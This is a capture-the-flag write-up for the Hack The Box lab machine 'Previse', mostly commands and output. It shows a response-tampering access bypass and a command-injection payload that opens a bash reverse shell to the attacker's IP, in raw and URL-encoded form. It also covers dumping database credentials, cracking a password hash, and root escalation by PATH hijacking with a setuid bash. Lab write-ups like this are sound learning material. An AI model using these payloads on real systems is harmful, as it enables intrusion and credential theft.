---
title: "Previse from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Previse from HTB
```bash
gobuster dir -u http://10.10.11.104/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.104/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 302) [Size: 2801] [--> login.php]
/download.php         (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 2224]
/files.php            (Status: 302) [Size: 4914] [--> login.php]
/header.php           (Status: 200) [Size: 980]
/nav.php              (Status: 200) [Size: 1248]
/footer.php           (Status: 200) [Size: 217]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/status.php           (Status: 302) [Size: 2966] [--> login.php]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/logs.php             (Status: 302) [Size: 0] [--> login.php]
```
then check directories
```bash
http://10.10.11.104/nav.php

- [Home](http://10.10.11.104/index.php)
- [ACCOUNTS](http://10.10.11.104/accounts.php)

    - [CREATE ACCOUNT](http://10.10.11.104/accounts.php)

- [FILES](http://10.10.11.104/files.php)
- [MANAGEMENT MENU](http://10.10.11.104/status.php)

    - [WEBSITE STATUS](http://10.10.11.104/status.php)
    - [LOG DATA](http://10.10.11.104/file_logs.php)

- [](http://10.10.11.104/nav.php#)
- [LOG OUT](http://10.10.11.104/logout.php)
```
reading the `create account`with `burpsuite`we see this code:
```html
<section class="uk-section uk-section-default">
    <div class="uk-container">
        <h2 class="uk-heading-divider">Add New Account</h2>
        <p>Create new user.</p>
        <p class="uk-alert-danger">ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!</p>
        <p>Usernames and passwords must be between 5 and 32 characters!</p>
    </p>
        <form role="form" method="post" action="accounts.php">
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: user"></span>
                    <input type="text" name="username" class="uk-input" id="username" placeholder="Username">
                </div>
            </div>
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: lock"></span>
                    <input type="password" name="password" class="uk-input" id="password" placeholder="Password">
                </div>
            </div>
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: lock"></span>
                    <input type="password" name="confirm" class="uk-input" id="confirm" placeholder="Confirm Password">
                </div>
            </div>
            <button type="submit" name="submit" class="uk-button uk-button-default">CREATE USER</button>
        </form>
    </div>
</section>
```
with this we know that we can create user.

or do `intercept+burpsuite` access `/accounts.php` and click `do intercept > response to this request` and then `click forward`, change the header to `200 Ok`. Now you can create an account
now `log in`
reading the `backup file`which can be downloaded in `logs.php`it is vulnerable.
in `http://10.10.11.104/file_logs.php`
use `intercpet`to intercept the request done by the site to get reverse shell
```bash
delim=comma; bash -c 'bash -i >& /dev/tcp/10.10.16.7/1234 0>&1'
```
`url-enocde`it
```bash
delim=comma%3b+bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.7/1234+0>%261'
```
on `netcat`
```bash
rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.104] 47512
bash: cannot set terminal process group (1596): Inappropriate ioctl for device
bash: no job control in this shell
www-data@previse:/var/www/html$
```
next
```bash
www-data@previse:/var/www/html$ cat config.php
                                cat config.php
cat config.php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```
now read `mysql databases`
```
www-data@previse:/var/www/html$ mysql -u root -p'mySQL_p@ssw0rd!:)'
mysql -u root -p'mySQL_p@ssw0rd!:)'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> use previse;
use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables
show tables
    -> ;
;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

mysql> select * from accounts
select * from accounts
    -> ;
;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | shavi    | $1$🧂llol$qqjrakCT5usowCXCfyT0Q/ | 2024-08-31 11:09:23 |
+----+----------+------------------------------------+---------------------+
```
then crack the `hash`
```bash
 hashcat hash /usr/share/wordlists/rockyou.txt

$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```
Then connect to `ssh`
```bash
ssh m4lwhere@10.10.11.104
Warning: Permanently added '10.10.11.104' (ED25519) to the list of known hosts.
Permission denied, please try again.
m4lwhere@previse:~$
```
***
User Flag is: 051b73c788aff39e96081dd9e81ef9c4
***
```bash
$ cd /tmp
$ export PATH=/tmp:$PATH
$ echo -ne '#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash' > gzip
$ chmod +x gzip
$ sudo /opt/scripts/access_backup.sh
$ ./bash -p
```
now you will be `root`
***
Root Flag is: 05ef18ad9a31dee4ca46f9316a734198
***
![](/assets/images/2024-08-31_15-41-00.png)
